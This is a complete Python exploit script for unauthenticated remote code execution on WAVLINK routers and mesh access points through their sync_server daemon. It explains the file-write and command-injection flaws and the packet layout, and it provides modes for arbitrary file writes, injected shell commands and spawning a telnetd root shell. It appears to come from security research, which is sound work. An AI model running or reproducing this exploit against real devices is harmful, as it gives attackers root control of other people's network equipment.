#!/usr/bin/env python3
"""
WAVLINK sync_server unauthenticated RCE (ATTACK_PATHS.md path 15 / path 24)

Zero-credential remote code execution via usr/bin/sync_server, the mesh-sync
daemon. Confirmed on two devices sharing this codebase:
  - WAVLINK NU516U1 (printer/router combo)
  - WAVLINK WN535M1 (dedicated mesh AP) -- vulnerable by default (MeshMode=1
    out of the box), live-fire confirmed with a real root shell.

Root cause (usr/bin/sync_server, decompiled): the TCP file-transfer handler
opens whatever path is given in the attacker-controlled "filename" field with
no validation (arbitrary file write), and separately, if that same filename
contains the substring "/tmp/sync_system/ap_report/", the full filename gets
sprintf'd unescaped into a shell command and passed to system() (command
injection). Precondition is simply that sync_server is running, which it is
by default on any mesh-active unit (MeshMode != "0").

Protocol (TCP, default port 13136):
  A single 128-byte header, followed by <size> bytes of file content.
    offset  size  field
    0       1     message type (5 = file transfer)
    1       4     file size, little-endian uint32
    5       6     MAC address placeholder (unused by this exploit)
    11      17    padding
    28      100   filename (null-padded)
  followed immediately by <size> raw bytes written verbatim into that file.

IMPORTANT quoting gotcha (cost real debugging time -- see ATTACK_PATHS.md
path 24): the vulnerable command is built as
    sprintf(cmd, "apply_sync_data.sh server %s&", filename)
Note the format string's OWN trailing '&'. If your injected command also
ends in ';', the result is "...;&" which is a shell syntax error that
silently kills the ENTIRE command line -- nothing runs at all, not even
the injected command. Do not end --command in ';'.
"""

import argparse
import socket
import struct
import sys

DEFAULT_PORT = 13136
INJECT_DIR = "/tmp/sync_system/ap_report/"
MAX_FILENAME_LEN = 99  # 100-byte field, must leave room for a null terminator


def build_message(filename: str, content: bytes) -> bytes:
    filename_bytes = filename.encode()
    if len(filename_bytes) > MAX_FILENAME_LEN:
        raise ValueError(
            f"filename too long ({len(filename_bytes)} bytes, max {MAX_FILENAME_LEN}): {filename!r}"
        )
    msg_type = bytes([5])
    size_field = struct.pack("<I", len(content))
    mac_placeholder = b"\x00" * 6
    padding = b"\x00" * 17
    filename_field = filename_bytes.ljust(100, b"\x00")
    header = msg_type + size_field + mac_placeholder + padding + filename_field
    assert len(header) == 128, len(header)
    return header + content


def send_message(target: str, port: int, filename: str, content: bytes, timeout: float = 10.0):
    with socket.create_connection((target, port), timeout=timeout) as s:
        s.sendall(build_message(filename, content))
        s.settimeout(3)
        try:
            resp = s.recv(4096)
            print(f"[+] Response: {resp!r}")
        except socket.timeout:
            print("[+] No response (expected -- this handler doesn't reply)")


def write_file(target: str, port: int, remote_path: str, content: bytes):
    """Arbitrary file write primitive. remote_path can be any absolute path
    reachable by open(O_CREAT|O_WRONLY|O_TRUNC); no directory traversal
    protection beyond needing the parent directory to already exist."""
    print(f"[*] Writing {len(content)} bytes to {remote_path!r} on {target}:{port}")
    send_message(target, port, remote_path, content)


def run_command(target: str, port: int, command: str, port_hint: int = None):
    """Command injection primitive. Requires the filename to land inside
    INJECT_DIR (that substring match is the trigger) and must NOT end in
    ';' -- see the module docstring."""
    if command.rstrip().endswith(";"):
        print(
            "[!] WARNING: command ends in ';' -- this will likely produce '...;&' "
            "and silently fail to execute anything. Stripping trailing ';'.",
            file=sys.stderr,
        )
        command = command.rstrip().rstrip(";")

    filename = INJECT_DIR + "x;" + command
    if len(filename.encode()) > MAX_FILENAME_LEN:
        raise ValueError(
            f"injected command too long to fit in the 100-byte filename field "
            f"(have {len(filename.encode())} bytes, max {MAX_FILENAME_LEN}); "
            f"keep it short, e.g. a single telnetd/wget invocation"
        )
    print(f"[*] Injecting command via {target}:{port}: {command!r}")
    print(f"[*]   -> full filename field: {filename!r}")
    # content can be anything; the write must simply succeed (open()+write()
    # completing fully is what unlocks the command-injection branch)
    send_message(target, port, filename, b"junk\n")


def pop_shell(target: str, port: int, shell_port: int):
    """Convenience wrapper: inject a telnetd spawn and report how to connect."""
    run_command(target, port, f"telnetd -p {shell_port} -l sh")
    print(f"[+] If successful, connect with: nc {target} {shell_port}")
    print(f"[+]   (or)                     : telnet {target} {shell_port}")
    print(f"[+] Remember to clean up afterwards: run_command(..., 'killall telnetd')")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("target", help="Target IP address")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"sync_server TCP port (default {DEFAULT_PORT})")

    sub = ap.add_subparsers(dest="mode", required=True)

    p_shell = sub.add_parser("shell", help="Open a telnetd shell (the quickest path to a root shell)")
    p_shell.add_argument("--shell-port", type=int, default=2323, help="Port for telnetd to listen on (default 2323)")

    p_cmd = sub.add_parser("cmd", help="Run an arbitrary command (must not end in ';')")
    p_cmd.add_argument("command", help="Shell command to inject")

    p_write = sub.add_parser("write", help="Arbitrary file write (no command execution)")
    p_write.add_argument("remote_path", help="Absolute path to write to (parent dir must exist)")
    p_write.add_argument("content", help="Content to write (as a string)")

    args = ap.parse_args()

    if args.mode == "shell":
        pop_shell(args.target, args.port, args.shell_port)
    elif args.mode == "cmd":
        run_command(args.target, args.port, args.command)
    elif args.mode == "write":
        write_file(args.target, args.port, args.remote_path, args.content.encode())


if __name__ == "__main__":
    main()
